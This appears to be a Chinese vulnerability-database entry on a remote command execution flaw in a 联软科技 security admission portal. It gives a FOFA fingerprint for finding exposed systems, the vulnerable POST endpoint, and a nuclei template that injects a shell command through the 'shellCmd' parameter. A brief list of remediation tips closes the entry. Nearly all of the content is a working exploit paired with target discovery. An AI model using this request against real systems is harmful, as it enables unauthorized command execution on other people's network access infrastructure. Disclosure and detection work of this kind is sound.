# 联软科技安全准入门户平台commondRetStr存在远程命令执行

- **系统**：联软科技安全准入门户平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.icon=="ae4facf2c5ca438696b5aa73379d955c"`
- **请求**：`POST /TunnelGateway/commondRetStr HTTP/1.1`

**请求体 / payload**
```
1. Fofa
web.icon=="ae4facf2c5ca438696b5aa73379d955c"
2、部分界面如下
3、隐患url,复现如下
id: lrkjzr-commondRetStr-rce
info:
name: lrkjzr-commondRetStr-rce
author: m0be1
severity: critical
description: 联软科技安全准入门户平台commondRetStr存在远程代码执行漏洞
http:
- raw:
-
Host: {{Hostname}}
Cookie: sdp_jsessionid=AA249E70ED8C27AEBF5623728AEA3F41
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
shellCmd=id
matchers:
- type: dsl
dsl:
- 'status_code==200 && contains_all(body,"uid")'
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。